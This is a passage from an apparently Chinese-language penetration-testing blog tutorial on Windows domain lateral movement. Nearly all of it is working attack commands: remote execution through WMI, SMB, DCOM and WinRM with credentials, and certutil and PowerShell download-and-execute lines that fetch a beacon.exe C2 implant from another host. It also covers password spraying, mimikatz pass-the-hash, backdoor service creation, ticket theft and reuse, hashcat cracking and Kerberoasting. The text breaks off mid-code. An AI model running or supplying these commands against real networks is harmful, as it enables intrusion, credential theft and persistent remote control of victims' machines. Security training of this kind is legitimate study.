class="variable">$Remote</span>.PayloadOutput</span><br></pre></td></tr></table></figure><h3 id="4-Invoke-WMIMethod"><a href="#4-Invoke-WMIMethod" class="headerlink" title="4.Invoke-WMIMethod"></a>4.Invoke-WMIMethod</h3><p>Powershell自带的Invoke-WMIMethod可以在远程系统中执行命令和指定程序</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//目标系统用户名</span><br><span class="line">$User = &quot;hacke\administrator&quot;</span><br><span class="line">//目标系统密码</span><br><span class="line">$Password= ConvertTo-SecureString -String &quot;Admin!@#$<span class="number">4321</span>&quot; -AsPlainText -Force</span><br><span class="line">//将账号和密码整合起来，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCreadential -ArgumentList $User , $Password</span><br><span class="line">//远程执行命令</span><br><span class="line">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot; -Creadential $Cred</span><br></pre></td></tr></table></figure><h3 id="5-crackmapexec"><a href="#5-crackmapexec" class="headerlink" title="5.crackmapexec"></a>5.crackmapexec</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> -u administrator -p Admin!@#$<span class="number">4321</span> -x &quot;<span class="built_in">net</span> user test test /add&quot;</span><br></pre></td></tr></table></figure><h3 id="6-smbexec"><a href="#6-smbexec" class="headerlink" title="6.smbexec"></a>6.smbexec</h3><p>smbexec可以通过文件共享（admin$、C$、ipc$、d$）在远程系统中执行命令，使用的时候，目标系的共享必须试开放的错c 、ipc、admin<br>C++版smbexec的下载地址<a href="https://github.com/sunorr/smbexec">https://github.com/sunorr/smbexec</a><br>1、工具使用</p><ul><li>test.exe：客户端程序</li><li>exec server.exe：目标系统中的辅助程序<br>2、使用方法<br>将execserver.exe上传到目标系统的C:\windwos\目录下，接触UAC对命令执行的限制。在命令行环境中执行如下命令</li></ul><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span> &quot;Admin!@#$<span class="number">4321</span>&quot; /user:HACKE\administrator</span><br></pre></td></tr></table></figure><p>之后在客户端的命令行环境中执行如下命令s</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span> administrator Admin!@#$<span class="number">4321</span> whoami c$</span><br></pre></td></tr></table></figure><p>VS2019编译的时候有问题，没编译成exes<br><strong>impact 工具包中的smbexec.exe</strong><br>这里依旧使用windows下编译好的smbexec.exe这里要注意的有两点，一个是\是为了转义而添加的，二是在密码处可以用双引号阔起来。这里因为在Windows下测试的，没有出现这个情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe HACKE/administrator:Admin!@#$4321@192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。<br>DCOM是基于组件对象模型（COM）的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95及之后版本的操作系统中）<br>条件：<br>1，使用目标Win7系统以上<br>2，管理员权限PowerShell<br>3，远程主机防火强未阻止<br><strong>dcomexec-impacket</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python dcomexec.py test/administrator:admin!@#123@192.168.3.32</span><br><span class="line">python dcomexec.py test/administrator:admin!@#123@192.168.3.32 whoami</span><br><span class="line">python dcomexec.py test/administrator:admin!@#123@192.168.3.32 whoami -hashes :517b96ad4178a5369dc997aa02d455c</span><br></pre></td></tr></table></figure><h2 id="WinRM-WinRS"><a href="#WinRM-WinRS" class="headerlink" title="WinRM&amp;WinRS"></a>WinRM&amp;WinRS</h2><p>WinRM（Windows Remote Management）, Windows远程管理,WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。Server2008 R2中默认开启该服务，Server2012开始，该服务便集成在系统中默认开启，家庭版的电脑是默认关闭的这种远程连接不会被客户端察觉到，也不会占用远程连接数！</p><p>WinRM端口：<br>HTTP是5985端口进行通信<br>HTTPS 是5986端口来进行通信</p><p>对方防火墙关闭，或者允许WinRM端口进行通信</p><p>开启WinRM服务<br>有俩种方式：</p><ul><li>powershell 运行 enable-psremoting</li><li>cmd运行winrm quickconfig</li></ul><p>通过winrs来执行远程命令</p><h3 id="winrs："><a href="#winrs：" class="headerlink" title="winrs："></a>winrs：</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx &quot;<span class="built_in">ipconfig</span>&quot; </span><br><span class="line">winrs -r:https://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx &quot;<span class="built_in">ipconfig</span>&quot; </span><br><span class="line">winrs -r:http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx <span class="built_in">cmd</span></span><br><span class="line">winrs -r:https://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx c</span><br></pre></td></tr></table></figure><h3 id="winrm-cmd"><a href="#winrm-cmd" class="headerlink" title="winrm.cmd"></a>winrm.cmd</h3><p>上线C2：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx &quot;<span class="built_in">cmd</span>.exe /c certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>/beacon.exe beacon.exe &amp; beacon.exe&quot; </span><br></pre></td></tr></table></figure><h3 id="winrm-cmd-1"><a href="#winrm-cmd-1" class="headerlink" title="winrm.cmd"></a>winrm.cmd</h3><p>CS上：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;<span class="built_in">cmd</span>.exe /c certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>/beacon.exe beacon.exe &amp; beacon.exe&quot;&#125; -r:机器名 -u:机器名\用户名 -p:密码</span><br></pre></td></tr></table></figure><h3 id="powershell："><a href="#powershell：" class="headerlink" title="powershell："></a>powershell：</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">dir</span> c:\ &#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-Credential</span> 域名\用户名 <span class="literal">-command</span> &#123;<span class="built_in">Get-Culture</span>&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-Credential</span> 域名\用户名 <span class="literal">-ScriptBlock</span> &#123;<span class="built_in">Get-Culture</span>&#125;</span><br></pre></td></tr></table></figure><p>如果报错，运行此命令<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-17%20012244.png"><br>只需要输入下面指令注册一下即可</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-17%20012431.png"></p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>远程左面服务，支持明文及HASH连接<br>条件：目标主机开启RDP服务，远程桌面，获取了明文或HASH密文<br>端口：3389<br>mstsc.exe</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | <span class="built_in">find</span> &quot;TermService&quot; #找到对应服务进程的PID</span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;PID值&quot;  #找到进程对应的端口号</span><br></pre></td></tr></table></figure><p>端口转发映射（不可取）<br>使用HTTP隧道，将对方3389端口绑定到本地2222端口<br><img src="/img/image.png" alt="alt text"><br>连接本地的127.0.0.1:2222端口<br><img src="/img/image-1.png" alt="alt text"><br>将获取的账户密码进行登录<br><img src="/img/image-2.png" alt="alt text"></p><p>SharpRDP（比较鸡肋）<br>在不通过 GUI 客户端和 Socks 代理的情况下，基于 RDP 协议进行横向移动。<br><a href="https://github.com/0xthirteen/SharpRDP">https://github.com/0xthirteen/SharpRDP</a> ，下载后直接用 Visual Studio 编译运行即可。<br>C2上线</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SharpRDP.exe <span class="attribute">computername</span>=ip <span class="attribute">command</span>=<span class="string">&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net,webclient).downloadstring(&#x27;http://ip:83/a&#x27;))\&quot;&quot;</span></span><br><span class="line"><span class="attribute">username</span>=用户名 <span class="attribute">password</span>=密码</span><br></pre></td></tr></table></figure><h2 id="CrackMapExec-密码喷射"><a href="#CrackMapExec-密码喷射" class="headerlink" title="CrackMapExec-密码喷射"></a>CrackMapExec-密码喷射</h2><p><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a><br>下载对应release，建立socks连接，设置socks代理，配置规则，调用!<br>1,Linux Proxychains使用<br>代理配置：Proxychains.conf<br>代理调用：Proxychains命令<br>2,密码喷射-域用户登录PTH：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参数：-u 用户 ，-<span class="selector-tag">p</span> 密码，-H 哈希值，-d 指定域，-<span class="attribute">x</span> 执行命令</span><br></pre></td></tr></table></figure><p>主要功能：多协议探针，字典设置，本地及域喷射，命令回显执行等</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518fa788f8878dc788faa89889c #域用户HASH登录</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上线C2</span></span><br><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518fa788f8878dc788faa89889c --local-auth -x &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.32/beacon.exe beacon.exe &amp; beacon.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>pass the hash（哈希传递攻击）<br>pass the ticket （票据传递攻击）<br>pass the key （密钥传递攻击）<br>PTH（pass the hash） # 利用的lm或ntlm的值进行的渗透测试（NTLM认证攻击）<br>PTK（pass the key ） #利用的ekeys aes256进行的渗透测试（NTLM认证攻击）<br>PTT（pass the ticket） #利用的票据凭证TGT进行渗透测试（Kerberos认证攻击）</p><p>逻辑思路：<br>明文传递-&gt;PTH(HASH传递)-&gt;PTT(票据攻击)-&gt;PTK(AES)</p><p>利用思路：</p><h3 id="一，利用直接的Hash传递"><a href="#一，利用直接的Hash传递" class="headerlink" title="一，利用直接的Hash传递"></a>一，利用直接的Hash传递</h3><h4 id="1，Mimikatz"><a href="#1，Mimikatz" class="headerlink" title="1，Mimikatz"></a>1，Mimikatz</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:<span class="number">192.168</span>.<span class="number">3.32</span> /ntlm:<span class="number">518</span>b32ca32c32144ck421aa31c321c</span><br><span class="line"><span class="comment"># 与域控建立IPC</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span></span><br><span class="line"><span class="comment">#将后门文件beacon.exe放到目标c盘中</span></span><br><span class="line"><span class="built_in">copy</span> beacon.exe \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span></span><br><span class="line"><span class="comment">#设置定时任务</span></span><br><span class="line"><span class="built_in">sc</span> \\test create bshell binpath=<span class="string">&quot;c:\4.exe&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\test <span class="built_in">start</span> bshell</span><br></pre></td></tr></table></figure><h4 id="2，impacket-at-ps-wemi-smb"><a href="#2，impacket-at-ps-wemi-smb" class="headerlink" title="2，impacket-at&amp;ps&amp;wemi&amp;smb"></a>2，impacket-at&amp;ps&amp;wemi&amp;smb</h4><p>psexec -hashes :NTLM值 域名&#x2F;域用户@域内ip地址<br>smbexec -hashes :NTLM值 域名&#x2F;域用户@域内ip地址<br>wmiexec -hashes :NTLM值 域名&#x2F;域用户@域内ip地址</p><h3 id="二，利用hash转成PTT传递"><a href="#二，利用hash转成PTT传递" class="headerlink" title="二，利用hash转成PTT传递"></a>二，利用hash转成PTT传递</h3><p>看下面PPT讲解</p><h3 id="三，利用hash进行暴力破解明文"><a href="#三，利用hash进行暴力破解明文" class="headerlink" title="三，利用hash进行暴力破解明文"></a>三，利用hash进行暴力破解明文</h3><p><a href="https://cmd5.com/">https://cmd5.com/</a><br><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashcat -<span class="selector-tag">a</span> <span class="number">0</span> -m <span class="number">1000</span> <span class="attr">--force</span> <span class="number">518</span>b32ca32c32144ck421aa31c321c pass<span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line">-m 密文类型</span><br><span class="line">-<span class="selector-tag">a</span> 破解类型</span><br><span class="line">?l 小写</span><br><span class="line">?s 符号</span><br><span class="line">?d 数字</span><br></pre></td></tr></table></figure><p>字典破解</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashcat</span> -a <span class="number">0</span> -m <span class="number">1000</span> hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>暴力破解</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashcat</span> -a <span class="number">3</span> -m <span class="number">1000</span> <span class="number">518</span>b32ca32c32144ck421aa31c321c ?l?l?l?l?l?s?s?s?d?d</span><br></pre></td></tr></table></figure><h3 id="1-kekeo-高权限，需NTLM"><a href="#1-kekeo-高权限，需NTLM" class="headerlink" title="1.kekeo(高权限，需NTLM)"></a>1.kekeo(高权限，需NTLM)</h3><ul><li>利用获取的NTML生成新的票据尝试认证</li></ul><p>因为当前主机肯定之前域其他主机连接过，所以本地应该会生成一些票据，我们导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗<br>缺点：票据是有有效期的，所以如果当前在连接过域控的话，有效期内可利用<br>生成票据：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> kekeo <span class="string">&quot;tgt:ask /user:Administrator /domain:god.org /ntlm:518b32ca32c32144ck421aa31c321c&quot;</span> <span class="string">&quot;eixt&quot;</span></span></span><br></pre></td></tr></table></figure><p>导入票据：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">shell</span> kekeo <span class="string">&quot;kerberos::ptt TGT_Administrator<span class="variable">@GOD</span>.ORG_krbtgt~god.org<span class="variable">@GOD</span>. ORG.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p>查看票据：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> klist</span></span><br></pre></td></tr></table></figure><p>利用票据连接：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\主机名\C<span class="variable">$</span></span><br><span class="line">shell net use \\主机名\C<span class="variable">$</span></span><br><span class="line"><span class="built_in">copy</span> beacon.exe \\主机名\C<span class="variable">$</span></span><br><span class="line"><span class="built_in">sc</span> \\主机名 create bindshell binpath=<span class="string">&quot;c:\beacon.exe&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\主机名 <span class="built_in">start</span> bindshell</span><br></pre></td></tr></table></figure><h3 id="2-mimikatz-高权限，需Ticket"><a href="#2-mimikatz-高权限，需Ticket" class="headerlink" title="2.mimikatz(高权限，需Ticket)"></a>2.mimikatz(高权限，需Ticket)</h3><ul><li>利用历史遗留的票据重新认证尝试</li></ul><p>导出票据：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /<span class="keyword">export</span></span><br></pre></td></tr></table></figure><p>导入票据：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [0;22d3a]<span class="string">-2</span><span class="string">-1</span><span class="string">-40</span>e00000-Administrator@krbtgt-god.org.kirbi</span><br></pre></td></tr></table></figure><p>查看票据：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> klist</span></span><br></pre></td></tr></table></figure><p>利用票据连接：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"> <span class="built_in">dir</span> \\主机名\c$</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：是否成功看当前主机有没有被目标连接过</p><h3 id="3-Kerberoasting"><a href="#3-Kerberoasting" class="headerlink" title="3.Kerberoasting"></a>3.Kerberoasting</h3><ul><li>利用通讯的加密类型票据进行爆破明文</li></ul><p>Kerberos攻击条件：<br>采用rc4加密类型票据，攻击Rubeus&amp;Impacket检测或看票据加密类型<br>Kerberoasting攻击利用：<br><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting</a></p><ul><li>SPN服务发现</li><li>请求服务票据</li><li>服务票据的导出</li><li>服务票据的暴力破解<br><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a><br><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></li></ul><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个<br>目标服务的服务票证。DC在活动目录中查找SPN，并用与SPN关联的服务帐户加密票<br>证，以便服务能验证用户是否可以访问。请求的Kerberos服务票证的密类型是<br>RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的<br>TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻<br>击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM<br>哈希值就将用于创建服务票证。</p><p><strong>注意</strong>：是否成功看当前主机票据加密类型<br>SPN:</p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN<br>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下<br>当一个服务的权限为<strong>Local System</strong>或<strong>Network Service</strong>，则SPN注册在机器帐户(Computers)下<br>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><p>SPN的格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure><ul><li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li><li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li><li>如果服务运行在默认端口上，则端口号(port)可以省略</li></ul><p>查询SPN<br>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测<br>(1) 使用SetSPN<br>查看当前域内的所有SPN：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -q <span class="strong">*/*</span></span><br></pre></td></tr></table></figure><p>查看test域内的所有SPN：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -T test -q <span class="strong">*/*</span></span><br></pre></td></tr></table></figure><p>输出示例：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CN=DC1,OU=Domain Controllers,DC=test,DC=com</span><br><span class="line">        exchangeRFR/DC1</span><br><span class="line">        exchangeRFR/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        exchangeMDB/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        exchangeMDB/DC1</span><br><span class="line">        exchangeAB/DC1</span><br><span class="line">        exchangeAB/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        SMTP/DC1</span><br><span class="line">        SMTP/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        SmtpSvc/DC1</span><br><span class="line">        SmtpSvc/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span>.com/ForestDnsZones<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span>.com/DomainDnsZones<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        Dfsr-<span class="number">12</span>F9A27C-BF97-<span class="number">4787</span>-<span class="number">9364</span>-D31B6C55EB04/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        DNS/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        GC/DC1<span class="selector-class">.test</span>.com/test<span class="selector-class">.com</span></span><br><span class="line">        RestrictedKrbHost/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        RestrictedKrbHost/DC1</span><br><span class="line">        HOST/DC1/TEST</span><br><span class="line">        HOST/DC1<span class="selector-class">.test</span>.com/TEST</span><br><span class="line">        HOST/DC1</span><br><span class="line">        HOST/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        HOST/DC1<span class="selector-class">.test</span>.com/test<span class="selector-class">.com</span></span><br><span class="line">        E3514235-<span class="number">4</span>B06-<span class="number">11</span>D1-AB04-<span class="number">00</span>C04FC2DCD2/<span class="number">0</span>f33253b-<span class="number">2314</span>-<span class="number">40</span>f0-b665-f4317b13e6b9/test<span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1/TEST</span><br><span class="line">        ldap/<span class="number">0</span>f33253b-<span class="number">2314</span>-<span class="number">40</span>f0-b665-f4317b13e6b9._msdcs<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span>.com/TEST</span><br><span class="line">        ldap/DC1</span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span>.com/test<span class="selector-class">.com</span></span><br><span class="line">CN=krbtgt,CN=Users,DC=test,DC=com</span><br><span class="line">        kadmin/changepw</span><br><span class="line">CN=COMPUTER01,CN=Computers,DC=test,DC=com</span><br><span class="line">        RestrictedKrbHost/COMPUTER01</span><br><span class="line">        HOST/COMPUTER01</span><br><span class="line">        RestrictedKrbHost/COMPUTER01<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        HOST/COMPUTER01<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</span><br><span class="line">        MSSQLSvc/DC1<span class="selector-class">.test</span>.com</span><br></pre></td></tr></table></figure><p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN<br>对于上面的输出数据，机器帐户(Computers)为：</p><ul><li>CN&#x3D;DC1,OU&#x3D;Domain Controllers,DC&#x3D;test,DC&#x3D;com</li><li>CN&#x3D;COMPUTER01,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;com</li></ul><p>域用户帐户(Users)为：</p><ul><li>CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</li><li>CN&#x3D;MSSQL Service Admin,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</li></ul><p>注册在域用户帐户(Users)下的SPN有两个：<strong>kadmin&#x2F;changepw</strong>和<strong>MSSQLSvc&#x2F;DC1.test.com</strong></p><p>域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p><p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p><p>因此，高效率的利用思路如下：</p><p>1,查询SPN，找到有价值的SPN，需要满足以下条件：</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul><p>2,请求TGS<br>3,导出TGS<br>4,暴力破解</p><h4 id="Kerberoasting的实现方法一（手动检测）"><a href="#Kerberoasting的实现方法一（手动检测）" class="headerlink" title="Kerberoasting的实现方法一（手动检测）"></a>Kerberoasting的实现方法一（手动检测）</h4><p>需要满足以下条件：</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul><p>手动原理：<br>先使用spn去获取那些通讯的服务<br>再去连接通讯这个服务，产生票据<br>查看票据的加密通讯类型判断能不能爆破<br>1、使用SetSPN<br>查看当前域内的所有SPN：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -q <span class="strong">*/*</span></span><br></pre></td></tr></table></figure><p>2、请求TGS<br>(1)请求指定TGS</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SPNName</span> = <span class="string">&#x27;MSSQLSvc/DC1.test.com&#x27;</span></span><br><span class="line">powershell Add-Type -AssemblyNAme System<span class="selector-class">.IdentityModel</span></span><br><span class="line">powershell New-Object System<span 